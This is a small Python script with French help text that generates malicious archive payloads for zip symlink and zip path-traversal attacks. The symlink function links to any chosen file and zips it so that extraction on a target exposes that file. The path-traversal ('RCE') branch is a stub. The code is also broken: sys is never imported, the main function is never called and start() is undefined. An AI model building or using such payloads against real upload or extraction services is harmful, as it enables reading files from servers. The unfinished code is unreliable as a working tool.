#!/usr/bin/env python3

import os
import argparse 
import subprocess
import logging

def parse_arguments():
    parser = argparse.ArgumentParser(description='Création de payload de fichiers d\'archives .zip, .tar...')
    
    parser.add_argument("type", help="symlink ou rce")
    parser.add_argument("input", help="The input file")
    parser.add_argument("-v", metavar = "verbosity", type = int, default = 2, help = "Verbosity : 0 - critical, 1 - error, 2 - warning, 3 - info, 4 - debug")

    args = parser.parse_args()
    verbose = {0 : logging.CRITICAL, 1 : logging.ERROR, 2 : logging.WARNING, 3 : logging.INFO, 4 : logging.DEBUG}
    logging.basicConfig(format='%(message)s', level=verbose[args.v], stream=sys.stdout)

    if args.type == "symlink":
        symlink(args.input)
    elif args.type == "path":
        print("B")
    else:
        print("Please choose one of the attack : Zip Symlink or Zip Path Travesal (RCE)")

    return args

def symlink(src):
    dst = 'Symlink/link'
    os.symlink(src,dst)
    os.system('zip --symlink Symlink/symlink.zip ' + dst )
    print("Your payload has been sucessfully created in the Symlink folder")
    return 0

def rce():
    return 0

start()
